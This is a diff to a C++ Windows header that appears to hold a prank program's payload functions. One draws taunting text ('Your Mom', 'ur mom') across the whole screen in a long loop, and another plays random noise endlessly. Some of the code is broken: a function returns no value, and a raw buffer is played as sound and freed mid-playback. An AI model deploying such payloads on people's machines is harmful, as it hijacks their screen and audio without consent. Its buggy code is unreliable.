@@ -1,5 +1,6 @@
 #pragma once
 #define fori(x) for (INT i = 0; i < x; i++)
+#define whiletrue while (true)
 
 int p1()
 { //msgbox
@@ -404,11 +405,51 @@ int p14()
 }
 
 // Put "Your Mom" on the screen as text
-int p15()
+int p15() //Do in thread
 {
-    MessageBoxW(NULL, L"Your Mom", L"Your Mom", MB_OK | MB_ICONINFORMATION);
-    fori(6942) {
-        TextOutA(GetDC(NULL), rand() % 1920, rand() % 1080, "Your Mom", 9);
+    fori(69420)
+    {
         Sleep(rand() % 100);
+        HDC hdc = GetDC(NULL);
+        SetTextColor(hdc, RGB(rand() % 255, rand() % 255, rand() % 255));
+        switch (i % 5) {
+            case 0:
+                TextOutA(hdc, rand() % GetSystemMetrics(SM_CXSCREEN), rand() % GetSystemMetrics(SM_CYSCREEN), "Your Mom", 9);
+                break;
+            case 1:
+                TextOutA(hdc, rand() % GetSystemMetrics(SM_CXSCREEN), rand() % GetSystemMetrics(SM_CYSCREEN), "ur mom", 7);
+                break;
+            case 2:
+                TextOutA(hdc, rand() % GetSystemMetrics(SM_CXSCREEN), rand() % GetSystemMetrics(SM_CYSCREEN), "bjormom", 8);
+                break;  
+            case 3:
+                TextOutA(hdc, rand() % GetSystemMetrics(SM_CXSCREEN), rand() % GetSystemMetrics(SM_CYSCREEN), "so bad", 6);
+                break;
+            default:
+                TextOutA(hdc, rand() % GetSystemMetrics(SM_CXSCREEN), rand() % GetSystemMetrics(SM_CYSCREEN), "ha", 3);
+                break;
+        }
+        ReleaseDC(NULL, hdc);
+    }
+}
+
+// Play randomly generated audio
+int p16() 
+{
+    whiletrue
+    {
+        Sleep(rand() % 100);
+        PlaySoundA(NULL, NULL, SND_ASYNC | SND_MEMORY);
+        LPSTR lpBuffer = (LPSTR)VirtualAlloc(NULL, 0x10000, MEM_COMMIT, PAGE_READWRITE);
+        if (lpBuffer == NULL)
+        {
+            break;
+        }
+        fori(0x10000)
+        {
+            lpBuffer[i] = rand() % 255;
+        }
+        PlaySoundA(lpBuffer, NULL, SND_ASYNC | SND_MEMORY);
+        VirtualFree(lpBuffer, 0, MEM_RELEASE);
     }
 }
